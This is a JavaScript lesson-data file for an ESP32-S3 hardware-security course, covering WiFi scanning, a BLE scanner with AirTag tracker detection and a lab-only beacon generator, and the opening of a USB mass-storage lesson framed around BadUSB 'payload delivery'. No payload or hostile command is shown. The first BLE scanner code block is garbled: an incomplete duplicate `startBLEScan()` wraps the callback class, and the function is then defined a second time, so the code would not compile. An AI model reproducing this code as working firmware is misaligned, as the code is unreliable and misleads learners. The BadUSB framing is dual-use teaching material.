                tip: '<strong>10-second scan interval</strong> is a good balance between freshness and radio activity. Faster scanning is possible but generates more RF traffic and drains battery faster if running on LiPo.'
            }
        ],

        testing: '<p>Verify:</p>' +
                 '<ul>' +
                 '<li><strong>Network detection:</strong> The list should show your own WiFi network and neighbors. Compare count with your phone WiFi list.</li>' +
                 '<li><strong>Signal color coding:</strong> Nearby APs should be green/cyan, distant ones yellow/red.</li>' +
                 '<li><strong>Hidden networks:</strong> Any hidden networks appear as "(hidden)" with their channel and BSSID still visible.</li>' +
                 '<li><strong>Channel histogram:</strong> Most networks should cluster on channels 1, 6, and 11.</li>' +
                 '<li><strong>Scrolling:</strong> USER button scrolls through the list if more than 8 networks found.</li>' +
                 '<li><strong>View toggle:</strong> BOOT button switches between list and histogram.</li>' +
                 '<li><strong>Auto-refresh:</strong> Networks update every 10 seconds without button press.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Zero networks found:</strong> Make sure <code>WiFi.mode(WIFI_STA)</code> is called before scanning. The radio must be in station mode to perform scans.</li>' +
                         '<li><strong>Only finding a few networks:</strong> The PCB antenna on the T-Display-S3 has limited range compared to external antennas. Move closer to known APs to verify detection.</li>' +
                         '<li><strong>Display flickers during scan:</strong> <code>WiFi.scanNetworks()</code> blocks for 2-5 seconds. Consider using async scanning (<code>WiFi.scanNetworks(true)</code>) to keep the display responsive.</li>' +
                         '<li><strong>Channel 14 networks not shown:</strong> Channel 14 is only legal in Japan. The ESP32 may not scan it by default depending on region settings.</li>' +
                         '<li><strong>Crash or watchdog reset:</strong> If you have too many networks (dense urban area), reduce the array size or add bounds checking on the sort loop.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Vendor OUI Lookup</strong> &mdash; Use the first 3 bytes of each BSSID to identify the access point manufacturer (Cisco, Ubiquiti, TP-Link, etc.). Store an OUI lookup table in SPIFFS and display the vendor name next to each network.</p>' +
                    '<p><strong>Challenge 2: Signal Strength Over Time</strong> &mdash; Track RSSI for a selected network across multiple scans. Draw a line graph showing signal strength over the last 60 seconds. This is useful for finding the physical location of an AP by walking toward stronger signal.</p>' +
                    '<p><strong>Challenge 3: Rogue AP Detection</strong> &mdash; Compare the current scan against a baseline (saved to SPIFFS). Alert when a new SSID appears that was not in the baseline &mdash; this could be a rogue AP or evil twin. Display new networks in red.</p>',

        stepVisuals: {},

        componentCallouts: {
            svg: '',
            components: [
                {
                    id: 't-display-s3',
                    name: 'LILYGO T-Display-S3 (from SG-103)',
                    purpose: 'The ESP32-S3 WiFi radio scans 2.4GHz channels for beacon frames. The TFT display shows network list and channel histogram. No external antenna needed for indoor scanning.',
                    specs: ['WiFi 802.11 b/g/n', '2.4GHz only (no 5GHz)', 'PCB antenna', 'Passive scanning only']
                }
            ]
        },

        commonMistakes: [
            {
                title: 'Forgetting WiFi.scanDelete() After Processing',
                correct: 'Call <code>WiFi.scanDelete()</code> after copying scan results to your own array. This frees the memory allocated by the scan.',
                incorrect: 'Repeatedly calling <code>WiFi.scanNetworks()</code> without deleting previous results.',
                consequence: 'Memory leak. After 10-20 scans, the ESP32-S3 runs out of heap memory and crashes with a watchdog reset. The device reboots mid-operation.'
            },
            {
                title: 'Scanning in AP Mode',
                correct: 'Set <code>WiFi.mode(WIFI_STA)</code> before scanning. Station mode allows the radio to scan all channels.',
                incorrect: 'Trying to scan while the ESP32-S3 is in AP mode (hosting its own network). Or not setting any mode.',
                consequence: 'Scan returns 0 networks or fails silently. The radio cannot scan while it is busy serving clients on a single channel.'
            },
            {
                title: 'Confusing Passive Scanning with Active Attacks',
                correct: 'Passive WiFi scanning only receives broadcast beacon frames. It is the same as your phone showing available networks. It is legal and non-intrusive.',
                incorrect: 'Assuming that a WiFi scanner is the same as a WiFi attack tool. Scanning does not send deauth frames, does not intercept traffic, and does not connect to networks.',
                consequence: 'Misunderstanding the legal and ethical boundaries. Passive scanning is reconnaissance. Active attacks (deauth, injection, spoofing) are separate techniques with different legal implications.'
            }
        ]
    }
,

    // ========================================================================
    // SG-106: BLE Swiss Army — Scanner, Beacon, Detector
    // ========================================================================
    'sg-106': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
        simulator: { available: false, note: 'Bluetooth Low Energy is <strong>not implemented</strong> in Wokwi &mdash; there is no simulated BLE radio to scan. This scanner needs a real ESP32-S3 near real BLE devices. Study the GAP/advertising concepts and code here first.' },
        intro: '<p>Bluetooth Low Energy (BLE) is everywhere &mdash; fitness trackers, smart locks, AirTags, medical devices, building sensors, and car key fobs. The ESP32-S3 has a full BLE 5.0 radio that can scan for devices, parse their advertisements, and generate custom beacons.</p>' +
               '<p>In this project you build a BLE multi-tool: a device scanner that classifies what it finds, a beacon detector that identifies Apple FindMy/AirTag trackers, and a beacon generator for testing BLE security policies. The display shows a real-time device dashboard.</p>' +
               '<p>BLE advertisements are broadcast openly &mdash; any BLE radio within range can receive them. Passive BLE scanning is legal and non-intrusive.</p>',

        wiring: '    No external wiring required.\n    T-Display-S3 with onboard BLE antenna.',

        wiringNotes: '<p><strong>No external wiring.</strong> BLE uses the same onboard antenna as WiFi on the ESP32-S3.</p>' +
                     '<p><strong>Safety:</strong> BLE scanning is passive and legal. Beacon generation should only be done in controlled lab environments. Generating excessive BLE advertisements in public spaces can interfere with legitimate devices and may violate local regulations.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg106-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg106-blepulse{0%,100%{r:4;opacity:0.8}50%{r:12;opacity:0.15}}' +
            '@keyframes sg106-beacon{0%{opacity:0}15%{opacity:0.7}100%{opacity:0;transform:translateY(-8px)}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg106-grid)" rx="4"/>' +
            '<text x="360" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-106 BLE SWISS ARMY</text>' +

            '<!-- T-Display-S3 Board -->' +
            '<rect x="40" y="60" width="240" height="200" rx="12" fill="#1e2736" stroke="#a855f7" stroke-width="2"/>' +
            '<rect x="40" y="60" width="240" height="28" rx="12" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="160" y="79" text-anchor="middle" fill="#c084fc" font-size="11" font-weight="700">LILYGO T-Display-S3</text>' +
            '<!-- TFT showing BLE dashboard -->' +
            '<rect x="55" y="100" width="100" height="140" rx="6" fill="#0a1628" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="105" y="116" text-anchor="middle" fill="#60a5fa" font-size="7" font-weight="600">BLE Dashboard</text>' +
            '<text x="65" y="132" fill="#c084fc" font-size="6">iPhone-12  Apple</text>' +
            '<text x="65" y="144" fill="#ef4444" font-size="6">AirTag     Tracker</text>' +
            '<text x="65" y="156" fill="#22c55e" font-size="6">Mi Band 7  Wearable</text>' +
            '<text x="65" y="168" fill="#eab308" font-size="6">Lock-BLE   SmartLock</text>' +
            '<text x="105" y="186" text-anchor="middle" fill="#8b949e" font-size="6">12 devices | BLE 5.0</text>' +
            '<rect x="65" y="194" width="80" height="30" rx="3" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
            '<text x="75" y="206" fill="#c084fc" font-size="6">MODE:</text>' +
            '<text x="75" y="218" fill="#8b949e" font-size="5">SCAN | DETECT | BEACON</text>' +
            '<!-- ESP32-S3 chip -->' +
            '<rect x="175" y="110" width="90" height="50" rx="6" fill="rgba(168,85,247,0.1)" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="220" y="132" text-anchor="middle" fill="#c084fc" font-size="8" font-weight="700">ESP32-S3</text>' +
            '<text x="220" y="146" text-anchor="middle" fill="#8b949e" font-size="6">BLE 5.0 Radio</text>' +
            '<!-- BLE Antenna -->' +
            '<rect x="195" y="170" width="50" height="24" rx="4" fill="rgba(59,130,246,0.08)" stroke="#3b82f6" stroke-width="1"/>' +
            '<text x="220" y="186" text-anchor="middle" fill="#60a5fa" font-size="7">2.4GHz</text>' +
            '<!-- USB-C -->' +
            '<rect x="135" y="248" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +
            '<text x="160" y="276" text-anchor="middle" fill="#8b949e" font-size="7">USB-C</text>' +

            '<!-- BLE pulse rings from antenna (animated) -->' +
            '<circle cx="320" cy="150" r="4" fill="none" stroke="#3b82f6" stroke-width="1" style="animation:sg106-blepulse 2s ease-out infinite"/>' +
            '<circle cx="320" cy="150" r="4" fill="none" stroke="#3b82f6" stroke-width="1" style="animation:sg106-blepulse 2s ease-out 0.7s infinite"/>' +
            '<circle cx="320" cy="150" r="4" fill="none" stroke="#3b82f6" stroke-width="1" style="animation:sg106-blepulse 2s ease-out 1.4s infinite"/>' +

            '<!-- Discovered BLE Devices -->' +
            '<g>' +
            '<rect x="370" y="60" width="310" height="130" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="370" y="60" width="310" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="370" y="76" width="310" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="525" y="76" text-anchor="middle" fill="#60a5fa" font-size="10" font-weight="600">DISCOVERED BLE DEVICES</text>' +
            '<!-- Device entries -->' +
            '<text x="380" y="102" fill="#c084fc" font-size="7">iPhone-12</text>' +
            '<text x="470" y="102" fill="#8b949e" font-size="6">Company: 0x004C (Apple)</text>' +
            '<text x="660" y="102" text-anchor="end" fill="#22c55e" font-size="7">-38dBm</text>' +
            '<text x="380" y="118" fill="#ef4444" font-size="7">AirTag</text>' +
            '<text x="470" y="118" fill="#8b949e" font-size="6">FindMy Tracker (0x12)</text>' +
            '<text x="660" y="118" text-anchor="end" fill="#eab308" font-size="7">-52dBm</text>' +
            '<text x="380" y="134" fill="#22c55e" font-size="7">Mi Band 7</text>' +
            '<text x="470" y="134" fill="#8b949e" font-size="6">Wearable (name match)</text>' +
            '<text x="660" y="134" text-anchor="end" fill="#eab308" font-size="7">-61dBm</text>' +
            '<text x="380" y="150" fill="#eab308" font-size="7">Lock-BLE</text>' +
            '<text x="470" y="150" fill="#8b949e" font-size="6">Smart Lock (name match)</text>' +
            '<text x="660" y="150" text-anchor="end" fill="#ef4444" font-size="7">-74dBm</text>' +
            '<text x="380" y="166" fill="#8b949e" font-size="7">[unnamed]</text>' +
            '<text x="470" y="166" fill="#8b949e" font-size="6">Company: 0x0075 (Samsung)</text>' +
            '<text x="660" y="166" text-anchor="end" fill="#ef4444" font-size="7">-79dBm</text>' +
            '</g>' +

            '<!-- Three modes box -->' +
            '<rect x="370" y="205" width="310" height="80" rx="8" fill="#1e2736" stroke="#f97316" stroke-width="1.5"/>' +
            '<rect x="370" y="205" width="310" height="24" rx="8" fill="rgba(249,115,22,0.12)"/>' +
            '<rect x="370" y="221" width="310" height="8" fill="rgba(249,115,22,0.12)"/>' +
            '<text x="525" y="221" text-anchor="middle" fill="#fb923c" font-size="10" font-weight="600">THREE MODES</text>' +
            '<rect x="380" y="240" width="88" height="34" rx="4" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="424" y="254" text-anchor="middle" fill="#22c55e" font-size="7" font-weight="600">SCANNER</text>' +
            '<text x="424" y="266" text-anchor="middle" fill="#8b949e" font-size="6">Classify all</text>' +
            '<rect x="478" y="240" width="92" height="34" rx="4" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.2)" stroke-width="0.5"/>' +
            '<text x="524" y="254" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">DETECTOR</text>' +
            '<text x="524" y="266" text-anchor="middle" fill="#8b949e" font-size="6">FindMy/AirTag</text>' +
            '<rect x="580" y="240" width="88" height="34" rx="4" fill="rgba(234,179,8,0.06)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
            '<text x="624" y="254" text-anchor="middle" fill="#eab308" font-size="7" font-weight="600">BEACON</text>' +
            '<text x="624" y="266" text-anchor="middle" fill="#8b949e" font-size="6">Lab only</text>' +

            '<!-- MAC rotation callout -->' +
            '<rect x="370" y="300" width="310" height="60" rx="6" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.2)" stroke-width="0.5"/>' +
            '<text x="380" y="318" fill="#ef4444" font-size="8" font-weight="600">MAC ADDRESS ROTATION</text>' +
            '<text x="380" y="334" fill="#8b949e" font-size="7">Modern devices rotate BLE MAC every ~15 min</text>' +
            '<text x="380" y="348" fill="#8b949e" font-size="7">Use manufacturer data + service UUIDs to identify</text>' +

            '<!-- Passive note -->' +
            '<rect x="40" y="300" width="240" height="60" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="50" y="318" fill="#4ade80" font-size="8" font-weight="600">NO EXTERNAL WIRING</text>' +
            '<text x="50" y="334" fill="#8b949e" font-size="7">BLE uses onboard 2.4GHz antenna</text>' +
            '<text x="50" y="348" fill="#8b949e" font-size="7">Scanning is passive and legal</text>' +

            '</svg>' +
            '</div>',

        steps: [
            {
                title: 'BLE Scanner — Discover All Nearby Devices',
                content: '<p>Use the ESP32 BLE library to perform active and passive scans. Each discovered device provides: name (if advertised), MAC address, RSSI, manufacturer data, service UUIDs, and advertisement flags.</p>',
                code: '#include <TFT_eSPI.h>\n#include <BLEDevice.h>\n#include <BLEUtils.h>\n#include <BLEScan.h>\n#include <BLEAdvertisedDevice.h>\n\nTFT_eSPI tft = TFT_eSPI();\nBLEScan* pBLEScan;\n\nstruct BLEDeviceInfo {\n    String name;\n    String address;\n    int rssi;\n    String type;     // "Phone", "Tracker", "Wearable", etc.\n    bool isApple;\n    bool isTracker;\n    unsigned long lastSeen;\n};\n\nBLEDeviceInfo devices[64];\nint deviceCount = 0;\n\nvoid startBLEScan() {\n    deviceCount = 0;\n    BLEDevice::deinit(false);\n    BLEDevice::init(\"\");\nclass ScanCallbacks: public BLEAdvertisedDeviceCallbacks {\n    void onResult(BLEAdvertisedDevice device) {\n        if (deviceCount >= 64) return;\n        \n        BLEDeviceInfo &d = devices[deviceCount];\n        d.name = device.haveName() ? String(device.getName().c_str()) : "";\n        d.address = String(device.getAddress().toString().c_str());\n        d.rssi = device.getRSSI();\n        d.lastSeen = millis();\n        \n        // Classify device type\n        d.isApple = false;\n        d.isTracker = false;\n        d.type = "Unknown";\n        \n        if (device.haveManufacturerData()) {\n            String mfr = String(device.getManufacturerData().c_str());\n            uint8_t* data = (uint8_t*)device.getManufacturerData().data();\n            size_t len = device.getManufacturerData().length();\n            \n            if (len >= 2) {\n                uint16_t companyId = data[0] | (data[1] << 8);\n                if (companyId == 0x004C) {  // Apple\n                    d.isApple = true;\n                    d.type = "Apple";\n                    if (len >= 4 && data[2] == 0x12) {\n                        d.isTracker = true;\n                        d.type = "FindMy Tracker";\n                    } else if (len >= 4 && data[2] == 0x07) {\n                        d.type = "AirPods";\n                    }\n                } else if (companyId == 0x0006) {\n                    d.type = "Microsoft";\n                } else if (companyId == 0x00E0) {\n                    d.type = "Google";\n                } else if (companyId == 0x0075) {\n                    d.type = "Samsung";\n                }\n            }\n        }\n        \n        if (d.name.indexOf("Band") >= 0 || d.name.indexOf("Watch") >= 0 || d.name.indexOf("Fit") >= 0) {\n            d.type = "Wearable";\n        }\n        if (d.name.indexOf("Lock") >= 0 || d.name.indexOf("lock") >= 0) {\n            d.type = "Smart Lock";\n        }\n        \n        deviceCount++;\n    }\n};\n\nvoid startBLEScan() {\n    deviceCount = 0;\n    BLEDevice::init("");\n    pBLEScan = BLEDevice::getScan();\n    static ScanCallbacks scanCb;\npBLEScan->setAdvertisedDeviceCallbacks(&scanCb, false);\n    pBLEScan->setActiveScan(true);\n    pBLEScan->setInterval(100);\n    pBLEScan->setWindow(99);\n    pBLEScan->start(5, false);  // 5 second scan\n    pBLEScan->clearResults();\n}',
                language: 'C++',
                tip: '<strong>Company ID 0x004C is Apple.</strong> The byte at offset 2 identifies the Apple sub-protocol: 0x12 = FindMy/AirTag, 0x07 = AirPods, 0x10 = Nearby. This is how BLE scanners detect Apple tracking devices.'
            },
            {
                title: 'Display Device Dashboard',
                content: '<p>Show discovered devices in a categorized dashboard with counts by type and a scrollable device list.</p>',
                code: 'void drawBLEDashboard() {\n    tft.fillScreen(TFT_BLACK);\n    \n    // Header\n    tft.setTextColor(0xA55F, TFT_BLACK);  // Purple\n    tft.setTextSize(1);\n    tft.setCursor(5, 2);\n    tft.printf("BLE SCANNER  %d devices found", deviceCount);\n    tft.drawLine(0, 12, 320, 12, 0x2104);\n    \n    // Count by type\n    int appleCount = 0, trackerCount = 0, wearableCount = 0, otherCount = 0;\n    for (int i = 0; i < deviceCount; i++) {\n        if (devices[i].isTracker) trackerCount++;\n        else if (devices[i].isApple) appleCount++;\n        else if (devices[i].type == "Wearable") wearableCount++;\n        else otherCount++;\n    }\n    \n    // Summary bar\n    tft.setCursor(5, 16);\n    tft.setTextColor(TFT_RED, TFT_BLACK);\n    tft.printf("Trackers:%d ", trackerCount);\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.printf("Apple:%d ", appleCount);\n    tft.setTextColor(TFT_GREEN, TFT_BLACK);\n    tft.printf("Wear:%d ", wearableCount);\n    tft.setTextColor(0x8410, TFT_BLACK);\n    tft.printf("Other:%d", otherCount);\n    \n    tft.drawLine(0, 28, 320, 28, 0x2104);\n    \n    // Device list\n    int maxVisible = 7;\n    for (int i = 0; i < min(deviceCount, maxVisible); i++) {\n        BLEDeviceInfo &d = devices[i];\n        int y = 32 + i * 18;\n        \n        // Signal bar\n        int barW = map(constrain(d.rssi, -100, -30), -100, -30, 2, 20);\n        uint16_t color = d.isTracker ? TFT_RED : (d.rssi > -60 ? TFT_GREEN : TFT_YELLOW);\n        tft.fillRect(2, y + 2, barW, 12, color);\n        \n        // Name or address\n        tft.setTextColor(TFT_WHITE, TFT_BLACK);\n        tft.setCursor(26, y + 3);\n        String label = d.name.length() > 0 ? d.name : d.address;\n        if (label.length() > 16) label = label.substring(0, 16) + "..";\n        tft.print(label);\n        \n        // Type\n        tft.setTextColor(d.isTracker ? TFT_RED : 0x8410, TFT_BLACK);\n        tft.setCursor(210, y + 3);\n        tft.print(d.type);\n        \n        // RSSI\n        tft.setCursor(290, y + 3);\n        tft.printf("%d", d.rssi);\n    }\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'FindMy/AirTag Tracker Detection',
                content: '<p>Apple FindMy trackers (AirTags, Chipolo, Tile with FindMy) broadcast specific BLE advertisements. Detecting these is a legitimate privacy feature &mdash; identifying if someone has planted a tracker on you or your belongings.</p>' +
                         '<p>Apple devices rotate their BLE MAC address every 15 minutes, but the FindMy advertisement pattern (Company ID 0x004C, Type 0x12) remains consistent.</p>',
                code: 'void checkForTrackers() {\n    int trackerCount = 0;\n    \n    for (int i = 0; i < deviceCount; i++) {\n        if (devices[i].isTracker) {\n            trackerCount++;\n            \n            // Alert on display\n            tft.setTextColor(TFT_RED, TFT_BLACK);\n            tft.setCursor(5, 155);\n            tft.printf("TRACKER ALERT: %s", devices[i].address.c_str());\n            tft.setCursor(5, 167);\n            tft.printf("RSSI: %d dBm  ", devices[i].rssi);\n            \n            // Proximity estimate\n            if (devices[i].rssi > -50) {\n                tft.print("VERY CLOSE (<1m)");\n            } else if (devices[i].rssi > -65) {\n                tft.print("NEARBY (1-3m)");\n            } else if (devices[i].rssi > -80) {\n                tft.print("IN RANGE (3-10m)");\n            } else {\n                tft.print("FAR (>10m)");\n            }\n        }\n    }\n    \n    if (trackerCount == 0) {\n        tft.setTextColor(TFT_GREEN, TFT_BLACK);\n        tft.setCursor(5, 155);\n        tft.println("No trackers detected");\n    }\n}',
                language: 'C++',
                tip: '<strong>AirTag detection is a legitimate privacy tool.</strong> Apple added unwanted tracker detection to iOS 14.5+ and Google added it to Android. Your ESP32-S3 tool does the same thing but works for anyone, regardless of phone brand.'
            },
            {
                title: 'BLE Beacon Generator (Lab Environment Only)',
                content: '<p>Generate custom BLE advertisements for testing detection systems and security policies. This is used to test whether a network or facility properly detects and alerts on unauthorized BLE devices.</p>' +
                         '<p><strong>Lab use only.</strong> Only generate beacons in your own controlled environment.</p>',
                code: '#include <BLEDevice.h>\n#include <BLEServer.h>\n#include <BLEUtils.h>\n#include <BLE2902.h>\n\nBLEAdvertising* pAdvertising;\n\nvoid startBeacon(const char* deviceName) {\n    BLEDevice::init(deviceName);\n    BLEServer* pServer = BLEDevice::createServer();\n    \n    pAdvertising = BLEDevice::getAdvertising();\n    \n    // Create a custom advertisement\n    BLEAdvertisementData advData;\n    advData.setFlags(0x06);  // General discoverable + BR/EDR not supported\n    advData.setCompleteServices(BLEUUID((uint16_t)0x180F));  // Battery Service\n    advData.setName(deviceName);\n    \n    pAdvertising->setAdvertisementData(advData);\n    pAdvertising->setScanResponseData(advData);\n    pAdvertising->start();\n    \n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.setCursor(5, 155);\n    tft.printf("Beacon: %s  ACTIVE", deviceName);\n}\n\nvoid stopBeacon() {\n    pAdvertising->stop();\n    BLEDevice::deinit(false);\n    tft.setTextColor(TFT_GREEN, TFT_BLACK);\n    tft.setCursor(5, 155);\n    tft.println("Beacon: STOPPED          ");\n}',
                language: 'C++',
                tip: '<strong>Testing use case:</strong> Deploy the beacon generator in a conference room. Then check whether your WIDS (Wireless Intrusion Detection System) detects and alerts on the unauthorized BLE device. If it does not, you have found a gap in your monitoring.'
            },
            {
                title: 'Multi-Mode Menu Integration',
                content: '<p>Combine all three modes into a single tool with a display menu: Scanner, Tracker Detector, and Beacon Generator. BOOT button switches modes, USER button activates the current mode.</p>',
                code: 'enum BLEMode { MODE_SCANNER, MODE_TRACKER, MODE_BEACON };\nBLEMode currentMode = MODE_SCANNER;\nbool beaconActive = false;\n\nvoid drawModeMenu() {\n    tft.fillRect(0, 0, 320, 30, TFT_BLACK);\n    \n    const char* modes[] = {"SCAN", "TRACK", "BEACON"};\n    for (int i = 0; i < 3; i++) {\n        int x = 5 + i * 105;\n        if (i == (int)currentMode) {\n            tft.fillRect(x, 2, 95, 16, 0xA55F);  // Purple highlight\n            tft.setTextColor(TFT_WHITE, 0xA55F);\n        } else {\n            tft.setTextColor(0x8410, TFT_BLACK);\n        }\n        tft.setCursor(x + 10, 5);\n        tft.print(modes[i]);\n    }\n}\n\nvoid setup() {\n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    pinMode(0, INPUT_PULLUP);\n    pinMode(14, INPUT_PULLUP);\n    \n    drawModeMenu();\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setCursor(20, 60);\n    tft.setTextSize(2);\n    tft.println("BLE SWISS ARMY");\n    tft.setTextSize(1);\n    tft.setCursor(20, 90);\n    tft.println("Press USER to start scan");\n}\n\nvoid loop() {\n    // BOOT: switch mode\n    if (digitalRead(0) == LOW) {\n        if (beaconActive) stopBeacon();\n        currentMode = (BLEMode)(((int)currentMode + 1) % 3);\n        tft.fillScreen(TFT_BLACK);\n        drawModeMenu();\n        delay(300);\n    }\n    \n    // USER: activate current mode\n    if (digitalRead(14) == LOW) {\n        switch (currentMode) {\n            case MODE_SCANNER:\n                tft.fillRect(0, 30, 320, 140, TFT_BLACK);\n                tft.setCursor(5, 35);\n                tft.setTextColor(TFT_CYAN, TFT_BLACK);\n                tft.println("Scanning BLE...");\n                startBLEScan();\n                drawBLEDashboard();\n                drawModeMenu();\n                break;\n            case MODE_TRACKER:\n                tft.fillRect(0, 30, 320, 140, TFT_BLACK);\n                tft.setCursor(5, 35);\n                tft.setTextColor(TFT_CYAN, TFT_BLACK);\n                tft.println("Scanning for trackers...");\n                startBLEScan();\n                drawBLEDashboard();\n                checkForTrackers();\n                drawModeMenu();\n                break;\n            case MODE_BEACON:\n                if (!beaconActive) {\n                    startBeacon("SG96_TEST_BEACON");\n                    beaconActive = true;\n                } else {\n                    stopBeacon();\n                    beaconActive = false;\n                }\n                break;\n        }\n        delay(500);\n    }\n}',
                language: 'C++',
                tip: null
            }
        ],

        testing: '<p>Verify each mode:</p>' +
                 '<ul>' +
                 '<li><strong>Scanner:</strong> Detects your phone, smartwatch, wireless earbuds, and any nearby BLE devices. Compare count with a phone BLE scanner app like nRF Connect.</li>' +
                 '<li><strong>Device classification:</strong> Apple devices show as "Apple", fitness bands as "Wearable", AirTags as "FindMy Tracker".</li>' +
                 '<li><strong>Tracker detection:</strong> If you have an AirTag, place it nearby and verify it appears with a red TRACKER ALERT and proximity estimate.</li>' +
                 '<li><strong>Beacon generator:</strong> Start the beacon, then use your phone (nRF Connect app) to verify "SG96_TEST_BEACON" appears as an advertisable device.</li>' +
                 '<li><strong>Mode switching:</strong> BOOT cycles through Scanner/Tracker/Beacon modes cleanly.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>No BLE devices found:</strong> Make sure BLE is enabled on your phone or test device. Some phones stop advertising when screen is off. Check that <code>BLEDevice::init("")</code> is called before scanning.</li>' +
                         '<li><strong>Scan takes too long:</strong> The scan duration is set to 5 seconds. Reduce to 3 for faster but potentially incomplete results.</li>' +
                         '<li><strong>WiFi and BLE conflict:</strong> On the ESP32-S3, WiFi and BLE share the same radio. You cannot scan WiFi and BLE simultaneously. Deinitialize one before starting the other.</li>' +
                         '<li><strong>Beacon not visible on phone:</strong> Some phones filter out beacons without specific service UUIDs. Add a standard UUID like Battery Service (0x180F) to improve visibility.</li>' +
                         '<li><strong>MAC addresses keep changing:</strong> BLE devices rotate their MAC addresses for privacy. Track devices by name or manufacturer data pattern rather than MAC.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Device Fingerprinting Database</strong> &mdash; Build a SPIFFS-stored database of known device fingerprints (manufacturer data patterns, service UUIDs, name patterns). Use it to classify devices more accurately: "Tile tracker", "Apple Watch Series 9", "Samsung Galaxy Buds", etc.</p>' +
                    '<p><strong>Challenge 2: BLE Proximity Alarm</strong> &mdash; Select a specific device by MAC/name and set an alarm when it moves beyond a threshold RSSI (e.g., alert when your laptop bag moves more than 10 meters away). This is a personal asset tracker.</p>' +
                    '<p><strong>Challenge 3: Advertisement Frequency Analysis</strong> &mdash; Measure how often each device broadcasts advertisements. Normal devices advertise every 100-1000ms. Unusually high rates could indicate a beacon spam attack or malfunctioning device. Graph the advertisement rate on the display.</p>',

        stepVisuals: {},
        componentCallouts: { svg: '', components: [{ id: 't-display-s3', name: 'LILYGO T-Display-S3', purpose: 'ESP32-S3 BLE 5.0 radio for scanning and beacon generation. TFT display for device dashboard. Same board from SG-103.', specs: ['Bluetooth 5.0 (BLE)', 'Onboard PCB antenna', 'Simultaneous scan + advertise', 'Company ID parsing'] }] },
        commonMistakes: [
            { title: 'Running WiFi and BLE Simultaneously', correct: 'Deinitialize WiFi before starting BLE scanning (<code>WiFi.mode(WIFI_OFF)</code>), and vice versa. Or use them sequentially in alternating scan cycles.', incorrect: 'Starting a BLE scan while WiFi is actively scanning or connected. They share the same 2.4GHz radio.', consequence: 'One or both radios fail silently. Scan results are incomplete or the device crashes with a radio conflict error.' },
            { title: 'Generating Beacons in Public Spaces', correct: 'Only generate BLE beacons in your own lab or classroom environment with instructor authorization. Turn off the beacon when testing is complete.', incorrect: 'Running a beacon generator in a public area like a library, coffee shop, or office building.', consequence: 'Excessive BLE advertisements can interfere with legitimate devices (hearing aids, medical monitors, access control systems). May also trigger security alerts in managed environments.' },
            { title: 'Assuming MAC Address Uniquely Identifies a Device', correct: 'Use manufacturer data patterns, service UUIDs, and device names for identification. MAC addresses rotate on modern BLE devices.', incorrect: 'Tracking devices by MAC address alone and assuming a new MAC means a new device.', consequence: 'Your device count is inflated. One iPhone appears as 20+ different devices over an hour because it rotates its BLE MAC address every 15 minutes.' }
        ]
    }
,

    // ========================================================================
    // SG-107: USB Mass Storage Emulation
    // ========================================================================
    'sg-107': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
        simulator: { available: false, note: 'USB Mass Storage exfiltration relies on the board enumerating as a <strong>USB storage device</strong> to a host &mdash; USB gadget behavior no simulator reproduces. Needs the real T-Display-S3.' },
        intro: '<p>The ESP32-S3 can present itself as a USB flash drive. When plugged into a computer, the host sees a removable storage device and can read files from it. Combined with the HID keyboard from SG-104, this creates a powerful combination: the device types commands that reference files on its own "USB drive."</p>' +
               '<p>This project uses TinyUSB Mass Storage Class (MSC) to serve files from the ESP32-S3 SPIFFS flash or an external microSD card. You will build a file server, a payload delivery system, and understand how BadUSB attacks combine HID and mass storage for maximum impact.</p>' +
               '<p>The defense perspective: understanding how a single USB device can simultaneously be a keyboard AND a flash drive is essential for building USB security policies that actually work.</p>',

        wiring: '    T-Display-S3 + MicroSD Breakout (optional)\n\n    If using SD card:\n    SD Module    T-Display-S3\n    VCC  ------> 3V3\n    GND  ------> GND\n    MISO ------> GPIO 13\n    MOSI ------> GPIO 11\n    SCK  ------> GPIO 12\n    CS   ------> GPIO 10',

        wiringNotes: '<p><strong>SD card is optional.</strong> Without it, the ESP32-S3 serves files from its internal SPIFFS flash (~4MB usable). With a microSD card, you get more storage and can swap cards between projects.</p>' +
